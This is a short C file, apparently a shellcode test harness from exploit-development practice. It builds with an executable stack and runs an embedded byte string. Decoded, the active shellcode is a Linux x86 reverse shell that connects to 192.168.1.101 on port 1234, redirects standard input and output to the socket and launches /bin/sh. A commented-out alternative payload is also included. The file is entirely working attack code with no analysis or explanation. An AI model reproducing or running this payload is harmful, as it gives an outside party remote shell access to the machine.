//gcc test-shellcode.c -z execstack -o test-shellcode
#include <stdio.h>
#include <string.h>
unsigned char code[]="\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x01\x65\x66\x68\x04\xd2\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80";

//shell code with nullbytes chars 
//unsigned char code[]="\xb8\x0b\x00\x00\x00\xbb\xa0\x90\x04\x08\xb9\x00\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80";

int main() {
  printf("shellcode length: %d\n", strlen(code));
  int (*ret)()= (int(*)())code;
  ret();
}

